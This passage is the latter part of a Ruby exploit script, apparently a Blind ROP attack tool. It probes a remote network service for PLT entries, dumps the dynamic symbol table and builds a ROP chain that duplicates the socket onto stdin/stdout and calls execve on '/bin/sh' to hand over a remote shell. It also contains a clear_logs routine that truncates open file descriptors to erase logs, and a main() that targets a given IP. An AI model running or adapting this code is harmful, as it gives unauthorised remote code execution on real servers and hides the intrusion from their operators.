		end
	end

	abort("dup2 not found")
end


def do_read(rop, fd, writable, read = $state.read)
	10.times do
		plt_call_3(rop, $state.write, fd, writable)
	end

	10.times do
		plt_call_3(rop, read, fd, writable)
	end

	plt_call_3(rop, $state.write, fd, writable)
end


def find_read()
	print("Finding read\n")

	fd = 100

	# 0x00690000
	writable = $state.writable
	str = "pwneddd"

	for i in 0..200
		print("Trying read at #{i.to_s(16)}\r")

		rop = []

		plt_call_2(rop, $state.dup2, $state.file_desc, fd)

		do_read(rop, fd, writable, i)

		rop << $death

		s = get_child()
		send_exp(s, rop)

		x = s.recv(1)
		s.write(str)

		stuff = "" + x

		while true
			begin
				x = s.recv(4096)
			rescue
				break
			end

			break if x.length == 0

			stuff += x
		end

		s.close()

		if stuff.include?(str)
			print("\nFound read at #{i.to_s(16)}\n")
			$state.read = i
			break
		end
	end
end

def find_good_rdx()
	print("Finding good rdx\n")

	addr = $state.rdi - 9

	fd = 100

	while true
		rop = []

		plt_call_2(rop, $state.dup2, $state.file_desc, fd)
		plt_call_3(rop, $state.write, fd, addr, addr)

		rop << $death

		s = get_child()
		send_exp(s, rop)
		x = s.recv(4096)

		print("find_good_rdx got #{x.length} at #{addr.to_s(16)}\n")

		if x.length >= 8
			$state.goodrdx = addr
			break
		end
		addr += x.length + 1

		addr += 1 if x.length == 0
	end
end

def do_execve()
	abort("execve() not previously found") if not $state.execve

	print("\nTrying execve at #{$state.execve}, writing to #{$state.writable.to_s(16)}\n")

	fd = 100

	# 0x00690000
	writable = $state.writable
	str = "/bin/sh\0"

	rop = []

			# DJM hack hack hack... The problem is, usleep isn't getting called or isn't doing anything.
			#print("\nSleeping 10 s just for giggles\n")
			#plt_call_1(rop, $state.usleep, 1000 * 1000 * 30)
		
	# Call dup2 to dup the victim's file descriptor to our known one.  Once we're in, we have control of stdin, stdout, and stderr.
	#		dup2($state.file_desc, fd)
	#		dup2(fd, 0)
	#		dup2(fd, 1)
	#		dup2(fd, 2)
	plt_call_2(rop, $state.dup2, $state.file_desc, fd)
	plt_call_2(rop, $state.dup2, fd, 0)
	plt_call_2(rop, $state.dup2, fd, 1)
	plt_call_2(rop, $state.dup2, fd, 2)
	
	# Write back the current contents of the writable location.
	plt_call_3(rop, $state.write, fd, writable, $state.goodrdx)

	# Sleep for 2 seconds
	plt_call_1(rop, $state.usleep, 1000 * 1000 * 2)

	# Call read().  This will (hopefully) read our string "/bin/sh\0" into the writable location
	plt_call_3(rop, $state.read, fd, writable, $state.goodrdx)

	# Write the writable location back to us so we can verify it was done.
	plt_call_3(rop, $state.write, fd, writable, $state.goodrdx)

	# Call execve
	plt_call_3(rop, $state.execve, writable, 0x400000+8, 0x400000 + 8)

	rop << $death

	# Send the above shell-launching ROP to the target
	print("Sending ROP chain:  write, usleep, read, write, execve\n")
	s = get_child()
	send_exp(s, rop)
	x = s.recv(1)

	# While our ROP chain is executing a read, send it the "/bin/sh" string.
	print("Sending '#{str}' to victim\n")
	s.write(str)

	print("Victim is waiting 2 secs...\n")

	# Read back any output.  We should see "/bin/sh" in our output, which indicates
	# that the write happened.

	stuff = "" + x

	while true
		begin
			x = s.recv(4096)
		rescue SystemCallError => e 
			print("Exception reading back sent info, err=#{e}\n")
			break
		rescue
			break
		end
		break if x.length == 0

		stuff += x

		print("do_execve received length  #{x.length}, stuff=#{stuff}\n")

		break if stuff.include?(str)
	end

	if not stuff.include?(str)
		print("Write didn't happen\n")
		s.close()
		return
	end

	# Send the "id" command, and look for "uid" in the output.
	print("Assuming shell is launched, sending 'id' command\n")
	s.write("\n\n\n\n\nid\n\n")

	while true
		begin
			Timeout.timeout (1) do
				x = s.recv(4096)
		  	end
		rescue Timeout::Error
			next
		rescue SystemCallError => e 
			print("Exception during final attack, err=#{e}\n")
			break
		rescue
			print("Unknownn exception during final attack")
			break;
		end
			
		break if x.length == 0

		print("Output from 'id':  #{x}\n")

		if x.include?("uid")
			#print("\nFound execve at #{i.to_s(16)}\n")
			#$state.execve = i  #DJM
			print("\n\nPWWWNNND!\n\n")
			save_state()
			print_progress()
			s.write("uname -a\nid\n")
			dropshell(s)
			s.close()
			exit(1)
			return
		end
	end

	s.close()
end


# search for ascii ZERO ascii
def has_str(stuff, skip = 0, strict = false)
	# 0 start
	# 1 found first ascii
	# 2 found zero
	# 3 found second ascii
	state = 0

	len = 0
	min = 3

	stuff.each_byte do |c|
		if skip > 0
			skip -= 1
			next
		end

		ascii = (c >= 0x20 and c <= 0x7E)

		case state
		when 0
			if ascii
				state = 1
				len   = 0
			else
				return false if strict
			end

		when 1
			if ascii
				len += 1
			elsif c == 0
				if len >= min
					state = 2
					len = 0
				else
					state = 0
					return false if strict
				end
			else
				state = 0
				return false if strict
			end

		when 2
			if ascii
				len += 1

				return true if len >= min
			else
				state = 0
				return false if strict
			end
		else
			abort("morte")
		end
	end

	return false
end

def got_sym(symno, symname)
	if symname == "read"
		$state.read = symno
		print("Read at #{$state.read}\n")
	elsif symname == "execve"
		$state.execve = symno
		print("Execve at #{$state.execve}\n")
	elsif symname == "usleep"
		$state.usleep = symno
		print("usleep at #{$state.usleep}\n")
	elsif symname == "dup2"
		$state.dup2_sym_no = symno
		print("dup2 at #{symno}\n")
	end
end


# dmccrady:  Up until now we have been calling PLT functions by an index relative to where we *think* the PLT base is.
# We might be off.  If we are off, we'll see a difference between the relative indices and the symbol numbers we found
# in the symbol table.  We'll use "dup2" as the standard, since we find it during the blind PLT search phase, and also
# find it during the symbol table dump.
def switch_to_fn_symbols()
	abort("dup2 not found") if not $state.dup2
	abort("dup2_sym_no not found") if not $state.dup2_sym_no

	offset = $state.dup2 - $state.dup2_sym_no 
	print("Adjusting PLT base by #{offset} entries... ")

	$state.plt_base += offset * 0x10
	print(" new PLT base at #{$state.plt_base.to_s(16)}\n")

	# adjust the function indices of the PLT entries we found blind.
	$state.strcmp -= offset
	$state.dup2 -= offset
	$state.write -= offset

	print("New function indices:  strcmp=#{$state.strcmp}, dup2=#{$state.dup2}, write=#{$state.write}, read=#{$state.read}, execve=#{$state.execve}\n")
end


def read_sym()
	print("Reading sym\n")

	prog = ""
	addr_start = 0x00400200 
	addr = addr_start
	dynstr = 0

	while true
		print("Trying syms at #{addr.to_s(16)}\r")
		x = dump_addr(addr)
		break if x.length == 0

		prog += x
		addr += x.length

		# I know it can be more efficient...
		if dynstr == 0 and has_str(prog)
			print("\nFound strings at #{addr.to_s(16)}\n")
			for i in 0..(prog.length - 1)
				if has_str(prog, i, true)
					dynstr = addr_start + i

					abort("damn") if i < 1
					abort("fdsf") if prog[i - 1] != "\x00"

					# XXX check 24 byte alignment

					dynstr -= 1
					print("dynstr at 0x#{dynstr.to_s(16)}\n")
					break
				end
			end
		end

		break if dynstr != 0
	end

	idx = dynstr - addr_start

	dynsym = 0
	symlen = 24

	while idx >= 0
		zeros = 0

		for i in 0..(symlen-1)

			c = prog[idx + i]

			zeros += 1 if c == "\x00"
		end

		if zeros == symlen
			dynsym = addr_start + idx
			break
		end

		idx -= symlen
	end

	if dynsym == 0
        	File.open("morte.bin", "w") { |file| file.write(prog) }
	end

	print("dynsym at 0x#{dynsym.to_s(16)}\n")

	idx = dynsym - addr_start

	print("Dumping symbols\n")

	symno = 0
	symtab = {}
	while idx < (dynstr - addr_start)
		stri = prog[idx..(idx + 3)]
		stri = stri.unpack("L<")[0]

		type = prog[idx + 4]
		type = type.unpack("C")[0]
		type &= 0xf

		val = prog[(idx + 8)..(idx + 16)]
		val = val.unpack("Q")[0]

		if stri > 0
			need = dynstr + stri + 30

			while addr < need
				print("Reading #{addr.to_s(16)}\r")
				x = dump_addr(addr)
				abort("dai") if x.length == 0

				prog += x
				addr += x.length
			end

			strstart = dynstr + stri - addr_start
			strend = strstart
			for i in strstart..(prog.length - 1)
				if prog[i] == "\x00"
					strend = i - 1
					break
				end
			end

			symname = prog[strstart..strend]

			print("Sym #{symno} #{type} #{symname}")
			print(" #{val.to_s(16)}") if val != 0
			print("\n")

			symtab[symno + 1] = symname
			got_sym(symno, symname)

#			symno += 1 if type == 2
#			# XXX
#			symno += 1 if symname == "__gmon_start__" 

			symno += 1

			if val > 0x500000
				$state.writable = val
				print("Setting writable to #{$state.writable.to_s(16)}, sym=#{symname}\n")
			end
		end

		idx += symlen
	end

	read_rel(addr, symtab)
end

def find_rel(prog)
	check = 3
	for i in 0..(prog.length-1)
		rem = prog.length - i

		break if rem < (24 * check)

		good = true

		for j in 0..(check - 1)
			idx = i + j * 24

			type = prog[idx..(idx + 3)].unpack("L<")[0]
			
			if type != 7
				good = false
				break
			end

			val = prog[(idx+8)..(idx + 8 + 7)].unpack("Q")[0]

			if val != 0
				good = false
				break
			end
		end

		return i if good
	end

	return -1
end

def read_rel(addr, symtab)
	start = addr

	print("Reading rel\n")
	prog = ""
	idx = 0

	while true
		print("Reading #{addr.to_s(16)}\r")
		x = dump_addr(addr)

		abort("sdf") if x.length == 0

		prog += x
		addr += x.length

		idx = find_rel(prog)

		break if idx >= 0
	end

	abort("sdfsdf") if idx < 8

	idx -= 8

	print("Found REL at #{(idx + start).to_s(16)}\n")

	slot = 0

	need = [ "read", "usleep", "execve", "ftruncate64", "exit" ]

	while true
		while prog.length - idx < 24
			print("Reading #{addr.to_s(16)}\r")
			x = dump_addr(addr);

			abort("sdfsdF") if x.length == 0

			prog += x
			addr += x.length
		end

		type = prog[(idx + 8)..(idx + 8 + 3)].unpack("L<")[0]

		abort("ddddd") if type != 0x7

		num = prog[(idx + 8 + 4)..(idx + 8 + 4 + 3)].unpack("L<")[0]

		#abort("sdfasdf") if num >= symtab.length   DJM... not sure why

		name = symtab[num]

		print("Slot #{slot} num #{num} #{name}\n")

		if need.include?(name)
			print("Found #{name} at #{slot}\n")
			eval("$state.#{name} = #{slot}")
			need.delete(name)

			break if need.empty?
		end

		idx += 24
		slot += 1
	end
end

def do_aslr()
	print("Assuming ASLR\n")
	stack_read()
	find_plt_depth()
end

def clear_logs()
	$url = "/dsafaasl"

	rop = []

	fds = 0..15

	ftruncate = $state.ftruncate64
	exitt = $state.exit

	for f in fds
		rop << $state.rdi
		rop << f

		rop << $state.rdi - 2
		rop << 0
		rop << 0

		#rop << ($state.plt + 0xb)
		#rop << ftruncate
		plt_fn(rop, ftruncate)
	end

	rop << $state.rdi
	rop << 0

	#rop << ($state.plt + 0xb)
	#rop << exitt
	plt_fn(rop, exitt)

	rop << $death

	rc = try_exp(rop)

	print("Cleared\n")
end

def pwn()
	print("Pwning\n")
	print_progress()

	check_vuln() if not $state.overflow_len
	check_overflow_len() if not $state.overflow_len
	print_progress()

	$sport = true

	find_plt_depth() if not $state.plt
	print_progress()

#	stack_read()

	do_aslr() if not $state.plt
	print_progress()

#	check_vsyscall() if not $vsyscall_mode
#	determine_target()
#	check_stack_depth() if not $state.depth
#	check_pad() if $state.pad == 0
#	find_plt() if not $state.plt
#	print_progress()

#	find_pops() if not $state.rax or not $state.syscall
#	find_pops() if not $state.rdi
	find_gadget() if not $state.rdi
	print_progress()

	find_rdx() if not $state.strcmp
	print_progress()

#	find_write() if not $state.write
#	find_write2() if not $state.write
	find_write3() if not $state.write
	print_progress()
#	find_rdi() if not $state.rdi
#	find_rsi() if not $state.rsi

#	find_fd()

	find_dup2() if not $state.dup2

	print_progress()

	read_sym() if not $state.read

	# Adjust function entries that we found blindly so they match the function symbol numbers
	# in the symbol table.  This will adjust the PLT base.
	switch_to_fn_symbols()

	print_progress()

	find_good_rdx() if not $state.goodrdx

#   dmccrady:  We already found execve by looking at the dynsym table.
#	find_execve() if not $state.execve

	do_execve()
#	dump_bin()
#	clear_logs()
#	exp()

	print_progress()
end

def load_state()
	$state.load()
end

def save_state(silent = false)
	$state.save()
end

def test()
	load_state()

	$state.pad = 0
	$state.depth = 0
	$state.overflow_len = 4192

	rop = Array.new(3) { |j| 0x400000 }
	try_exp(rop)

# unlink changes rdx ; qsort interesting
# strncmp

	rop = []
	r   = 0x402da1
	plt = 0x402490

	plt += 0x10 * 10

	plt = 0x000000000402860

	for i in 0..5
		plt += 0x10 * i

		print("Doing 0x#{plt.to_s(16)}\n")

		rop << $state.rdi
		rop << 0x400000

		rop << $state.rdi - 2
		rop << 0x400000
		rop << 0

		rop << plt
		rop << r
	end

	rc = try_exp(rop)
	print("RC IS #{rc}\n")

	exit(1)
end

def main()
#	test()

	begin
		load_state()

		if ARGV.length > 1
			exp()
		elsif ARGV.length == 1
			$ip = ARGV[0]
			print("Pwning IP #{$ip}\n")
		end
		pwn()
		save_state()
	rescue Interrupt => e
		print("\nInterrupt\n")
		puts e.backtrace
		save_state()
	end
end

main()
